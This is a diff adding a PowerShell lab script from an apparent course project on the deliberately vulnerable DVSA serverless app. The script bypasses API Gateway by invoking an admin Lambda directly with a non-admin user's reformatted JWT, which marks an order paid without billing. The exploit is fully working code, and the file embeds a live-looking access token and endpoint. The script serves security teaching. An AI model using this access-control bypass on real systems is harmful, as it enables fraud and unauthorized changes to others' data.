@@ -1,0 +1,115 @@
+# ============================================================
+# ICS-344 DVSA Project - Lesson #5: Broken Access Control
+# ============================================================
+
+$REGION      = "eu-north-1"
+$API         = "https://gfxvwxy0n4.execute-api.eu-north-1.amazonaws.com/dvsa/order"
+$VICTIM_USER = "902c395c-e0e1-7094-4b06-3d92b3d7900b"
+$ORDER_ID    = "9d4f152d-4381-4dea-91f1-bcf611f0c77a"
+$VICTIM_TOKEN = "eyJraWQiOiI1bk5mTE5tUXlPNmhWaStGbHBheEkyb09ldUxZMmR2c3h0cDR0OXo1MDFBPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI5MDJjMzk1Yy1lMGUxLTcwOTQtNGIwNi0zZDkyYjNkNzkwMGIiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAuZXUtbm9ydGgtMS5hbWF6b25hd3MuY29tXC9ldS1ub3J0aC0xX0RmMW1HczdOSyIsImNsaWVudF9pZCI6IjcyOG1iZ2RzbmxjZ2tlYXFrMTE4am1obGQ3Iiwib3JpZ2luX2p0aSI6IjU5N2RjOWJiLWUyYWMtNDI4OC04NWIyLTVmOTEzZTU3ZDhiNyIsImV2ZW50X2lkIjoiMGYwNzM4ZjAtYWEyMC00YmJjLWE3YTEtYWE5ZjAzZWRiMGY0IiwidG9rZW5fdXNlIjoiYWNjZXNzIiwic2NvcGUiOiJhd3MuY29nbml0by5zaWduaW4udXNlci5hZG1pbiIsImF1dGhfdGltZSI6MTc3NzA1NDcyOCwiZXhwIjoxNzc3MDU4MzI4LCJpYXQiOjE3NzcwNTQ3MjgsImp0aSI6IjFlYTFiMDBkLTMzNjMtNDEwNy05NDRlLTgxYTdhMmUxNWQ3ZCIsInVzZXJuYW1lIjoiOTAyYzM5NWMtZTBlMS03MDk0LTRiMDYtM2Q5MmIzZDc5MDBiIn0.SiBybLgyfxZ3m-OoAWWf4P1b5vbPlQJ_84HkDzsIhA22zAgfDfkyaar3uBe4-KzMHocq3sLaO9LJJGm2ZRzEWdLsF3g3oqgyzEmMDHh2QX2wg9qIcSqHBmYL7ysbKjuFcxMEYE8JRUXK_qsTkhFWszkrGkjR4-ojUEOhrz-GtmEeqkBi_1QYxfqNDMLPoK2UvyKvSMsTZhLMonM4ggTE3zPU2QE8D3crK-oNxWZ8Hs6_Lg04oX0EQtJyKWiNFs3vLHliWrgTQv35mpr-LXho4zflJemJdkxHeSJemMq2N6XcxROoL6oCNuZB6a0Zi5prihNPWWtFEGoZk5y-RwSMNA"
+
+$HEADERS = @{
+    "Authorization" = $VICTIM_TOKEN
+    "Content-Type"  = "application/json"
+}
+
+Write-Host ""
+Write-Host "============================================================" -ForegroundColor Magenta
+Write-Host "   LESSON 5: BROKEN ACCESS CONTROL - PATCH PHASE         " -ForegroundColor Magenta
+Write-Host "============================================================" -ForegroundColor Magenta
+
+# STEP 1: Show order status BEFORE
+Write-Host ""
+Write-Host "------------------------------------------------------------" -ForegroundColor Cyan
+Write-Host "  Step 1: Order status BEFORE exploit                       " -ForegroundColor Cyan
+Write-Host "------------------------------------------------------------" -ForegroundColor Cyan
+$scanResult = (aws dynamodb scan --table-name DVSA-ORDERS-DB --region $REGION --output json | ConvertFrom-Json)
+foreach ($order in $scanResult.Items) {
+    if ($order.orderId.S -eq $ORDER_ID) {
+        Write-Host "  Order ID: $($order.orderId.S)" -ForegroundColor White
+        Write-Host "  Status:   $($order.orderStatus.N)  -- 100=open, 120=paid" -ForegroundColor White
+    }
+}
+
+# STEP 2: Show API blocks non-admin
+Write-Host ""
+Write-Host "------------------------------------------------------------" -ForegroundColor Cyan
+Write-Host "  Step 2: API correctly blocks non-admin (403)              " -ForegroundColor Cyan
+Write-Host "------------------------------------------------------------" -ForegroundColor Cyan
+try {
+    Invoke-RestMethod -Uri $API -Method POST -Headers $HEADERS `
+        -Body '{"action":"admin-orders","data":{"status":"120"}}' | ConvertTo-Json
+} catch {
+    Write-Host "  Response: $($_.Exception.Response.StatusCode.value__) - Forbidden" -ForegroundColor Yellow
+    Write-Host "  API Gateway correctly blocks non-admin users" -ForegroundColor Green
+}
+
+# STEP 3: EXPLOIT - Fix base64url padding issue then send
+Write-Host ""
+Write-Host "------------------------------------------------------------" -ForegroundColor Cyan
+Write-Host "  Step 3: EXPLOIT - Direct Lambda invoke, bypassing API GW  " -ForegroundColor Cyan
+Write-Host "------------------------------------------------------------" -ForegroundColor Cyan
+
+Write-Host "  Target order: $ORDER_ID" -ForegroundColor White
+Write-Host "  Invoking DVSA-ADMIN-UPDATE-ORDERS as non-admin..." -ForegroundColor Red
+
+# Fix base64url to standard base64 for the JWT payload section
+# The Lambda uses base64.b64decode which needs standard base64 with padding
+$parts = $VICTIM_TOKEN.Split('.')
+$payloadB64Url = $parts[1]
+# Convert base64url to standard base64
+$payloadB64 = $payloadB64Url.Replace('-', '+').Replace('_', '/')
+# Add padding
+$mod = $payloadB64.Length % 4
+if ($mod -eq 2) { $payloadB64 += "==" }
+elseif ($mod -eq 3) { $payloadB64 += "=" }
+# Reconstruct token with padded payload (header.paddedpayload.sig)
+$fixedToken = "$($parts[0]).$payloadB64.$($parts[2])"
+
+$exploitEvent = @{
+    headers = @{
+        authorization = $fixedToken
+    }
+    body = (@{
+        "order-id" = $ORDER_ID
+        status     = 120
+    } | ConvertTo-Json -Compress)
+}
+$exploitJson = $exploitEvent | ConvertTo-Json -Compress -Depth 5
+[System.IO.File]::WriteAllText("$env:TEMP\l5payload.json", $exploitJson, [System.Text.UTF8Encoding]::new($false))
+
+Write-Host "  Fixed token (base64url->base64): applied" -ForegroundColor Gray
+Write-Host ""
+
+aws lambda invoke `
+    --function-name DVSA-ADMIN-UPDATE-ORDERS `
+    --region $REGION `
+    --payload "file://$env:TEMP\l5payload.json" `
+    --cli-binary-format raw-in-base64-out `
+    "$env:TEMP\l5response.json"
+
+Write-Host "  Lambda response:" -ForegroundColor White
+Get-Content "$env:TEMP\l5response.json"
+
+# STEP 4: Verify
+Write-Host ""
+Write-Host "------------------------------------------------------------" -ForegroundColor Cyan
+Write-Host "  Step 4: Order status AFTER exploit                        " -ForegroundColor Cyan
+Write-Host "------------------------------------------------------------" -ForegroundColor Cyan
+$verifyResult = (aws dynamodb scan --table-name DVSA-ORDERS-DB --region $REGION --output json | ConvertFrom-Json)
+foreach ($order in $verifyResult.Items) {
+    if ($order.orderId.S -eq $ORDER_ID) {
+        $newStatus = $order.orderStatus.N
+        Write-Host "  Order ID:      $($order.orderId.S)" -ForegroundColor White
+        Write-Host "  Status BEFORE: 100 (open)" -ForegroundColor White
+        Write-Host "  Status AFTER:  $newStatus" -ForegroundColor White
+        if ($newStatus -eq "120") {
+            Write-Host ""
+            Write-Host "  *** EXPLOIT CONFIRMED: Order is PAID (120) without billing ***" -ForegroundColor Red
+        } else {
+            Write-Host "  Status unchanged - see Lambda response above" -ForegroundColor Yellow
+        }
+    }
+}
+
+Write-Host ""
